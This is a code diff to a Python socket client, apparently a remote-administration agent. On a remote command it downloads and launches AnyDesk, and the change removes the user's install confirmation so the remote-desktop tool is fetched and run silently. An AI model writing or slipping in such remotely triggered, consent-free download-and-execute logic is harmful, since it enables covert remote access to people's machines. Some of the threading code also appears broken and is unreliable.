@@ -95,15 +95,15 @@ class Client:
     def anydesk(self):
         # Threaded Process
         def run_ad():
-            return subprocess.run(self.anydesk_path)
+            return subprocess.run(self.destination)
 
         self.logger.debug(f"Running anydesk()...")
         try:
             if os.path.exists(r"C:\Program Files (x86)\AnyDesk\anydesk.exe"):
-                anydeskThread = threading.Thread(target=self.anydeskThread, name="Run Anydesk")
-                anydeskThread.daemon = True
+                self.anydeskThread = threading.Thread(target=self.anydeskThread, name="Run Anydesk")
+                self.anydeskThread.daemon = True
                 self.logger.debug(f"Calling anydeskThread()...")
-                anydeskThread.start()
+                self.anydeskThread.start()
                 self.logger.debug(f"Sending Confirmation...")
                 self.soc.send("OK".encode())
 
@@ -111,38 +111,31 @@ class Client:
                 error = "Anydesk not installed."
                 self.logger.debug(f"Sending error message: {error}...")
                 self.soc.send(error.encode())
-
                 try:
-                    self.logger.debug(f"Waiting for install confirmation...")
-                    install = self.soc.recv(self.buffer_size).decode()
-                    if str(install).lower() == "y":
-                        url = "https://download.anydesk.com/AnyDesk.exe"
-                        destination = rf'c:\users\{os.getlogin()}\Downloads\anydesk.exe'
+                    url = "https://download.anydesk.com/AnyDesk.exe"
+                    self.destination = rf'c:\users\{os.getlogin()}\Downloads\anydesk.exe'
 
-                        if not os.path.exists(destination):
-                            self.logger.debug(f"Sending downloading message...")
-                            self.soc.send("Downloading anydesk...".encode())
+                    if not os.path.exists(self.destination):
+                        self.logger.debug(f"Sending downloading message...")
+                        self.soc.send("Downloading anydesk...".encode())
 
-                            self.logger.debug(f"Downloading anydesk.exe..")
-                            wget.download(url, destination)
-                            self.logger.debug(f"Download complete.")
+                        self.logger.debug(f"Downloading anydesk.exe..")
+                        wget.download(url, self.destination)
+                        self.logger.debug(f"Download complete.")
 
-                        self.logger.debug(f"Sending running anydesk message...")
-                        self.soc.send("Running anydesk...".encode())
+                    self.logger.debug(f"Sending running anydesk message...")
+                    self.soc.send("Running anydesk...".encode())
 
-                        self.logger.debug(f"Running anydesk...")
-                        programThread = Thread(target=run_ad, name='programThread')
-                        programThread.daemon = True
-                        programThread.start()
+                    self.logger.debug(f"Running anydesk...")
+                    programThread = Thread(target=run_ad, name='programThread')
+                    programThread.daemon = True
+                    programThread.start()
 
-                        self.logger.debug(f"Sending Confirmation...")
-                        self.soc.send("Anydesk Running.".encode())
+                    self.logger.debug(f"Sending Confirmation...")
+                    self.soc.send("Anydesk Running.".encode())
 
-                        self.logger.debug(f"Sending final confirmation...")
-                        self.soc.send("OK".encode())
-
-                    else:
-                        return False
+                    self.logger.debug(f"Sending final confirmation...")
+                    self.soc.send("OK".encode())
 
                 except (WindowsError, socket.error, socket.timeout) as e:
                     self.logger.debug(f"Error: {e}")
